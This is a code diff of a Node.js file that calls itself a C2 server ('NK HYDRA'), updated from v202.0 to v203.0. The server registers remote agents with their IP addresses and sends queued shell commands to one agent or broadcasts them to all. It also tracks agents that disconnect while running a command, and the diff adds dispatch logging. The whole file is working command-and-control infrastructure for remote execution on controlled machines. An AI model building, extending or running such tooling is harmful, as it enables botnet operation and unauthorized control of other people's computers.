@@ -1,5 +1,5 @@
 // TYPE: NODE.JS C2 SERVER
-// NK HYDRA v202.0 [CRASH CORRELATION & STABILITY]
+// NK HYDRA v203.0 [DISPATCH CONFIRMATION]
 
 const express = require('express');
 const http = require('http');
@@ -12,24 +12,22 @@ app.use(cors());
 // Health Check
 app.get('/health', (req, res) => { res.status(200).send('OK'); });
 app.get('/', (req, res) => { 
-    res.json({ status: 'online', version: 'v202.0', agents: agents.length }); 
+    res.json({ status: 'online', version: 'v203.0', agents: agents.length }); 
 });
 
 const server = http.createServer(app);
 const io = new Server(server, { 
     cors: { origin: "*", methods: ["GET", "POST"] },
     pingInterval: 10000, 
-    pingTimeout: 40000, // Increased timeout for heavy ops
-    maxHttpBufferSize: 1e8, // 100MB
+    pingTimeout: 40000, 
+    maxHttpBufferSize: 1e8, 
     transports: ['polling', 'websocket'] 
 });
 
 let agents = []; 
 const commandQueue = [];
 let adminSocket = null; 
-
-// --- CRASH TRACKING ---
-const activeCommands = new Map(); // socketId -> { cmd, timestamp }
+const activeCommands = new Map();
 
 const logToAdmin = (level, message, details = {}) => {
     if (adminSocket) {
@@ -53,12 +51,18 @@ const processQueue = async () => {
             try {
                 if (task.targetId === 'all') {
                     io.emit('exec_cmd', { cmd: task.cmd, id: task.id });
+                    logToAdmin('INFO', 'Broadcast Sent', { cmd: task.cmd });
                 } else {
                     const agent = agents.find(a => a.id === task.targetId);
                     if (agent && agent.socketId) {
+                         // LOG DISPATCH
+                         logToAdmin('INFO', `Dispatching to ${agent.id}`, { cmd: task.cmd, socketId: agent.socketId });
+                         
                          io.to(agent.socketId).emit('exec_cmd', { cmd: task.cmd, id: task.id });
-                         // Track command start
+                         
                          activeCommands.set(agent.socketId, { cmd: task.cmd, start: Date.now() });
+                    } else {
+                        logToAdmin('WARNING', 'Agent Not Found for Task', { target: task.targetId });
                     }
                 }
             } catch (e) {
@@ -77,22 +81,29 @@ io.on('connection', (socket) => {
             socket.join('ui_room');
             adminSocket = socket;
             socket.emit('agents_list', agents);
+            logToAdmin('SUCCESS', 'Admin UI Connected');
             return;
         }
+        
+        // Remove old instance
         agents = agents.filter(a => a.id !== data.id);
-        agents.push({ ...data, socketId: socket.id, status: 'Online', lastSeen: Date.now() });
+        
+        const newAgent = { ...data, socketId: socket.id, status: 'Online', lastSeen: Date.now() };
+        agents.push(newAgent);
+        
         io.to('ui_room').emit('agents_list', agents);
+        logToAdmin('SUCCESS', `Agent Online: ${data.id}`, { ip: data.ip });
         
         if(commandQueue.length > 0) processQueue();
     });
 
     socket.on('exec_cmd', (data) => {
+        logToAdmin('INFO', 'Command Queued via UI', { cmd: data.cmd });
         commandQueue.push({ ...data, id: Date.now().toString() });
         processQueue();
     });
     
     socket.on('agent_event', (data) => {
-        // If execution finished, remove from active tracking
         if (data.type === 'SUCCESS' || data.type === 'ERROR') {
              const agent = agents.find(a => a.id === data.agentId);
              if (agent) activeCommands.delete(agent.socketId);
@@ -106,17 +117,14 @@ io.on('connection', (socket) => {
             agent.status = 'Offline'; 
             io.to('ui_room').emit('agents_list', agents);
             
-            // CRASH ANALYSIS
             const lastCmd = activeCommands.get(socket.id);
             if (lastCmd) {
                 logToAdmin('CRITICAL', 'AGENT CRASH DETECTED', { 
                     reason: `Agent disconnected while executing: ${lastCmd.cmd}`,
                     possible_cause: 'Memory Overflow or Socket Timeout',
-                    recommendation: 'Use output redirection (> file.txt) or rate limiting.'
+                    recommendation: 'Use output redirection.'
                 });
                 activeCommands.delete(socket.id);
-            } else {
-                logToAdmin('WARNING', `Agent Disconnected: ${agent.id}`, { reason });
             }
         } else if (socket === adminSocket) {
             adminSocket = null;
@@ -130,4 +138,4 @@ io.on('connection', (socket) => {
 });
 
 const PORT = process.env.PORT || 3000;
-server.listen(PORT, () => console.log(`HYDRA v202 LISTENING ON ${PORT}`));
+server.listen(PORT, () => console.log(`HYDRA v203 LISTENING ON ${PORT}`));
